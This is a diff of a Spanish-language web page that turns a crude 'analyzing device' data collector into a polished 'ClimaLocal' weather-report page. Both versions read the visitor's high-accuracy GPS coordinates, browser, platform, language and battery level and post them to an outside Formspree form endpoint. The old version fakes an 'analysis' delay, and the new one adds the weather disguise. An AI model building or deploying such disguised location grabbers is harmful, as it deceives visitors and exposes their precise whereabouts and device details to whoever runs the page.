@@ -3,77 +3,210 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cargando...</title>
+    <title>ClimaLocal — Reporte Rápido</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background-color: #0f0f0f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e1e1e; padding: 20px; border-radius: 12px; text-align: center; width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        h2 { margin-top: 0; font-size: 18px; }
-        p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
-        .btn { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; }
-        .loader { border: 3px solid #333; border-top: 3px solid #007bff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { margin-top: 10px; font-size: 13px; color: #4cd137; display: none; }
+        * { box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #141e30, #243b55);
+            color: #f5f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .card {
+            background: rgba(25, 35, 52, 0.92);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 28px 24px;
+            border-radius: 16px;
+            text-align: center;
+            width: 100%;
+            max-width: 360px;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
+        }
+        .badge {
+            display: inline-block;
+            background: rgba(56, 189, 248, 0.15);
+            color: #7dd3fc;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 4px 10px;
+            border-radius: 999px;
+            margin-bottom: 12px;
+        }
+        h1 {
+            margin: 0 0 8px;
+            font-size: 21px;
+        }
+        p {
+            font-size: 14px;
+            color: #cbd5e1;
+            line-height: 1.5;
+            margin: 0 0 22px;
+        }
+        .btn {
+            background: #0ea5e9;
+            color: #fff;
+            border: none;
+            padding: 12px 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 600;
+            width: 100%;
+            transition: background 0.2s ease, transform 0.1s ease;
+        }
+        .btn:hover { background: #0284c7; }
+        .btn:active { transform: scale(0.99); }
+        .loader {
+            border: 3px solid rgba(255, 255, 255, 0.15);
+            border-top: 3px solid #38bdf8;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            animation: spin 0.9s linear infinite;
+            margin: 18px auto 10px;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            margin-top: 14px;
+            font-size: 13px;
+            line-height: 1.45;
+            padding: 12px;
+            border-radius: 10px;
+            display: none;
+        }
+        .status.ok {
+            display: block;
+            background: rgba(34, 197, 94, 0.15);
+            border: 1px solid rgba(34, 197, 94, 0.35);
+            color: #86efac;
+        }
+        .status.err {
+            display: block;
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.35);
+            color: #fca5a5;
+        }
+        .meta {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #94a3b8;
+        }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>📡 Analizando dispositivo...</h2>
-    <p>Toca el botón para ver los detalles.</p>
-    <button class="btn" onclick="enviar()">Ver Datos</button>
+    <span class="badge">🌤️ Servicio Local</span>
+    <h1>Reporte de Zona y Equipo</h1>
+    <p>Activa la consulta para preparar el reporte de tu ubicación actual y el estado básico de tu sesión.</p>
+
+    <button class="btn" id="btnAction" onclick="generarReporte()">Generar reporte ahora</button>
     <div class="loader" id="spinner"></div>
-    <div id="status">✅ Enviado al servidor</div>
+    <div class="status" id="statusBox"></div>
+
+    <div class="meta">Proyecto académico • Envío vía Formspree</div>
 </div>
 
 <script>
-    // ⚠️ IMPORTANTE: Reemplaza la línea de abajo con TU LINK DE FORMSPREE ⚠️
-    const API_URL = "https://formspree.io/f/xgakrnjg"; 
+    const API_URL = "https://formspree.io/f/xgakrnjg";
 
-    async function enviar() {
-        document.querySelector('.btn').style.display = 'none';
-        document.getElementById('spinner').style.display = 'block';
+    async function obtenerUbicacion() {
+        if (!("geolocation" in navigator)) {
+            return { disponible: false, motivo: "No soportado" };
+        }
 
-        let info = {};
+        return new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        disponible: true,
+                        latitud: pos.coords.latitude,
+                        longitud: pos.coords.longitude,
+                        precisionMetros: Math.round(pos.coords.accuracy)
+                    });
+                },
+                (err) => {
+                    resolve({
+                        disponible: false,
+                        motivo: err.message || "Permiso denegado o no disponible"
+                    });
+                },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+        });
+    }
+
+    async function obtenerBateria() {
+        if (!("getBattery" in navigator)) {
+            return "No disponible";
+        }
+        try {
+            const b = await navigator.getBattery();
+            return `${Math.round(b.level * 100)}%${b.charging ? " (cargando)" : ""}`;
+        } catch (e) {
+            return "No disponible";
+        }
+    }
+
+    async function generarReporte() {
+        const btn = document.getElementById("btnAction");
+        const spinner = document.getElementById("spinner");
+        const statusBox = document.getElementById("statusBox");
+
+        btn.style.display = "none";
+        statusBox.className = "status";
+        statusBox.style.display = "none";
+        spinner.style.display = "block";
+
+        const ubicacion = await obtenerUbicacion();
+        const bateria = await obtenerBateria();
+
+        const payload = {
+            fechaHora: new Date().toISOString(),
+            ubicacion,
+            dispositivo: {
+                userAgent: navigator.userAgent,
+                plataforma: navigator.platform,
+                idioma: navigator.language,
+                pantalla: `${window.screen.width}x${window.screen.height}`,
+                bateria
+            }
+        };
 
         try {
-            // 1. Ubicación
-            if (navigator.geolocation) {
-                await new Promise(resolve => navigator.geolocation.getCurrentPosition(p => {
-                    info.lat = p.coords.latitude;
-                    info.lon = p.coords.longitude;
-                    resolve();
-                }, () => { info.error = true; resolve(); }));
-            }
-
-            // 2. Dispositivo
-            info.ua = navigator.userAgent;
-            info.plat = navigator.platform;
-            info.lang = navigator.language;
-            
-            // 3. Batería
-            let battery = 0;
-            try { 
-                let b = await navigator.getBattery(); 
-                battery = Math.round(b.level * 100); 
-            } catch(e){}
-            info.battery = battery + "%";
-
-            // Simular espera de "análisis"
-            await new Promise(r => setTimeout(r, 2000));
-
-            // Enviar a Formspree
-            await fetch(API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(info)
+            const resp = await fetch(API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+                body: JSON.stringify(payload)
             });
 
-            document.getElementById('spinner').style.display = 'none';
-            document.getElementById('status').style.display = 'block';
-            document.getElementById('status').innerText = "✅ Datos enviados a jp39919622@gmail.com";
+            spinner.style.display = "none";
 
+            if (!resp.ok) {
+                throw new Error("Respuesta no válida de Formspree");
+            }
+
+            statusBox.className = "status ok";
+            statusBox.innerHTML = ubicacion.disponible
+                ? `✅ Reporte enviado correctamente.<br><small>Coordenadas: ${ubicacion.latitud.toFixed(4)}, ${ubicacion.longitud.toFixed(4)}</small>`
+                : `✅ Reporte de equipo enviado.<br><small>Ubicación no compartida (${ubicacion.motivo}).</small>`;
         } catch (error) {
-            document.getElementById('status').innerText = "Error al enviar.";
+            spinner.style.display = "none";
+            btn.style.display = "block";
+            statusBox.className = "status err";
+            statusBox.textContent = "❌ No se pudo enviar el reporte. Revisa tu conexión o el endpoint de Formspree.";
         }
     }
 </script>
